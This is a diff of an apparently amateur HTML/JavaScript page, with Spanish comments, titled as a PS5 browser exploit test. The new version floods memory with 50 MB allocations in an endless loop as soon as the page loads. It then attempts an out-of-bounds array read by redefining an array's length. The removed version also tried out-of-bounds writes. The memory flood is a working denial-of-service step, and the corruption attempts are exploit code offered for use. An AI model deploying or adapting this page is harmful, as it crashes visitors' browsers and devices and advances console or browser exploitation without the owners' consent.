@@ -1,23 +1,32 @@
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <title>PS5 Exploit Fase 2: Corrupción OOB</title>
+  <meta charset="utf-8">
+  <title>💥 PS5 Nuke + OOB test</title>
   <style>
-    body { background: black; color: #0f0; font-family: monospace; padding: 1em; }
-    #log { white-space: pre-wrap; }
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+    }
   </style>
 </head>
 <body>
-  <h1>PS5 Exploit Fase 2: Corrupción OOB (Out of Bounds)</h1>
-  <div id="log"></div>
+  <h1>💥 PS5 Nuke + OOB test</h1>
+  <p>Ejecutando técnicas agresivas + corrupción Out-Of-Bounds tentativa</p>
+  <pre id="log"></pre>
 
   <script>
-    const log = (msg) => document.getElementById("log").textContent += msg + "\n";
+    const log = document.getElementById("log");
+    function print(msg) {
+      console.log(msg);
+      log.textContent += msg + "\n";
+    }
 
-    let buf = new ArrayBuffer(8);
-    let f64 = new Float64Array(buf);
-    let u32 = new Uint32Array(buf);
+    // Convierte float64 <-> int64 (64bit)
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
 
     function f2i(f) {
       f64[0] = f;
@@ -30,34 +39,48 @@
       return f64[0];
     }
 
-    // Grooming básico para tener arrays homogéneos
-    let arr = new Array(10).fill(13.37);
-    log("Array inicial: " + arr.length);
-
-    // Intenta corromper la propiedad length (en navegadores viejos con bug)
-    try {
-      Object.defineProperty(arr, "length", { value: 0x100, writable: true });
-      log("Corrupt length to 0x100");
-    } catch(e) {
-      log("No se pudo corromper length: " + e);
+    // 1. Saturar la memoria para preparar heap
+    function memoryFlood() {
+      const big = [];
+      try {
+        while (true) {
+          big.push(new Uint8Array(50_000_000));
+          if (big.length % 10 === 0) print(`💣 Memoria saturada: ${big.length * 50}MB aprox`);
+        }
+      } catch (e) {
+        print("💥 Memoria saturada capturada: " + e);
+      }
+      return big;
     }
 
-    // Intenta leer fuera de límites
-    try {
-      let oobVal = arr[0x80];
-      log("OOB read arr[0x80]: " + oobVal);
-    } catch(e) {
-      log("No se pudo leer fuera de límites: " + e);
+    // 2. Corrupción OOB tentativa en array
+    function corruptArrayOOB() {
+      print("[*] Intentando corrupción OOB");
+      let arr = [1.1, 2.2, 3.3];
+      try {
+        Object.defineProperty(arr, 'length', { value: 0x100 });
+        print("[+] Corrupt length a 0x100");
+      } catch (e) {
+        print("[-] No se pudo corromper length: " + e);
+      }
+
+      try {
+        let leak = arr[0x80];
+        print("[+] Leak OOB en arr[0x80]: " + leak);
+      } catch (e) {
+        print("[-] No se pudo leer fuera de límites: " + e);
+      }
     }
 
-    // Intenta escribir fuera de límites
-    try {
-      arr[0x80] = 1337.1337;
-      log("OOB write arr[0x80] = 1337.1337");
-      log("arr[0x80]: " + arr[0x80]);
-    } catch(e) {
-      log("No se pudo escribir fuera de límites: " + e);
+    // Base agresiva (simplificada, solo memoria)
+    function aggressiveBase() {
+      memoryFlood();
+      corruptArrayOOB();
     }
+
+    window.onload = () => {
+      setTimeout(aggressiveBase, 10);
+    };
   </script>
 </body>
 </html>
